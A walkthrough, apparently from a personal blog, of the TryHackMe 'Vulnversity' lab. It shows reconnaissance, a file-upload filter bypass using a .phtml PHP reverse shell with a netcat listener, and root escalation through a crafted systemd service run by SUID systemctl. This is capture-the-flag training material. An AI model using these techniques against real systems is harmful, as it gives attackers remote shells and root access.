---
title: "Vulnversity - TryHackMe"
author: krishna
description: "Walkthrough of Vulnversity from TryHackMe"
date: 2020-10-16 22:22:22 +0530
categories: [writeups, tryhackme]
tags: [privesc, pentest, ctf]
---

**[Vulnversity from TryHackMe](https://tryhackme.com/room/vulnversity)**

## Task 1 - Deploy the machine

deployment B), lezz go

## Task 2 - Reconnaissance

1. Scan this box: `nmap -sV <machines ip>`

	![nmap scan results](/assets/img/tryhackme/vulnversity/vuln1.png)

2. Scan the box, how many ports are open?

	`6`

3. What version of the squid proxy is running on the machine?

	`3.5.12`

4. How many ports will nmap scan if the flag -p-400 was used?

	`400`

5. Using the nmap flag -n what will it not resolve?

	`DNS`

6. What is the most likely operating system this machine is running?

	`Ubuntu`

7. What port is the web server running on?

	`3333`

8. Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don't forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background)

## Task 3 - Locating directories using GoBuster

1. Now lets run GoBuster with a wordlist: `gobuster dir -u http://<ip>:3333 -w <word list location>`

	![gobuster help](/assets/img/tryhackme/vulnversity/vuln2.png)

2. What is the directory that has an upload form page?

	![go gobuster](/assets/img/tryhackme/vulnversity/vuln3.png)
	
	`/internal/`

	![/internal/index.php](/assets/img/tryhackme/vulnversity/vuln4.png)

## Task 4 - Compromise the webserver

1. Try upload a few file types to the server, what common extension seems to be blocked?

	on uploading a `.php` file,
	
	![hey not allowed](/assets/img/tryhackme/vulnversity/vuln5.png)

2. To identify which extensions are not blocked, we're going to fuzz the upload form. To do this, we're doing to use BurpSuite. If you are unsure to what BurpSuite is, or how to set it up please complete our [BurpSuite room](https://tryhackme.com/room/rpburpsuite) first.

	*sucks that the burpsuite room is only for subscribers*

3. Make a wordlist of different php extensions. Use **burpsuite** to send the upload POST request to `intruder` and add *that dollar-like sign* at appropriate places. Then start the attack.

	```terminal
	$ cat phpext_list.txt
	.php
	.php3
	.php4
	.php5
	.phtml
	```

	for some reason, the **intruder**'s sniper attack did not work for me i.e. gave the same response for all extensions. So, upon trying them manually, we get success for **`.phtml`**

4. A reverse php shell is given [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and change the value of the IP to your IP from the `tun0` interface. Change the extension to `.phtml`. Listen on `1234` through `netcat` with the command `nc -vlnp 1234`. Then upload the shell file, navigate to the file by going to the file URL, `http://$MACHINE_IP:3333/internal/uploads/php_rev_shell.phtml` to make the machine execute your file.

	when we go to the URL,

	![boom access](/assets/img/tryhackme/vulnversity/vuln6.png)

	now, we have spawned a shell

5. What is the name of the user who manages the webserver?

	the home folders for users are created at `/home/`. `ls /home/` shows us that a user, **`bill`** exists.

6. What is the user flag?

	![yea flag B)](/assets/img/tryhackme/vulnversity/vuln7.png)

## Task 5 - Privilege Escalation 

1. intro to SUID. find all binaries with SUID.

	to find all such binaries, we can run `find / -perm -4000 2>/dev/null`

	* `find` to search

	* `/` to start from the topmost directory

	* `-perm` to specify permission value

	* `-4000` to specify SUID permission value of exactly 4000

	* `2 > /dev/null` to hide all the errors by redirecting stderr to null stream

	![sweet suid](/assets/img/tryhackme/vulnversity/vuln8.png)

	`/bin/systemctl` is of importance here as you will see in the next question

2. Its challenge time! We have guided you through this far, are you able to exploit this system further to escalate your privileges and get the final answer? Become root and get the last flag (/root/root.txt)

	[gtfobins](https://gtfobins.github.io/) is a curated list of unix binaries that can be used for privilege escalation

	[this](https://gtfobins.github.io/gtfobins/systemctl/) gtfobins article on **systemctl** tells us how to exploit it to run any command as superuser

	so taking inspiration from that, we can do this

	```terminal
	$ RFLAG=$(mktemp).service
	$ echo '[Service]
	  Type=oneshot
	  ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/theFLAG"
	  [Install]
	  WantedBy=multi-user.target' > $RFLAG
	$ /bin/systemctl link $RFLAG
	$ /bin/systemctl enable --now $RFLAG
	```

	then to view the flag, `cat /tmp/theFLAG`

	![yea root flag B)](/assets/img/tryhackme/vulnversity/vuln9.png)